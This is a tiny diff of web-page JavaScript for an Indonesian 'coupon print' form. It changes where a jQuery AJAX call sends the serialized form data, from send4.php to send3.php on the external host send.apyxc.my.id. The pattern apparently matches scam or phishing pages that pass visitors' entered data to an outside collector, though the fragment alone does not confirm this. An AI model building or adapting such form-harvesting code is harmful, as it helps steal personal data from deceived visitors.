@@ -9,7 +9,7 @@ document.getElementById('kirim').innerHTML = "Memproses Cetak Kupon....";
 
  $.ajax({
  type: 'POST',
- url: 'https://send.apyxc.my.id/req/send4.php',
+ url: 'https://send.apyxc.my.id/req/send3.php',
  data: $(formData).serialize(),
  datatype: 'text',
  
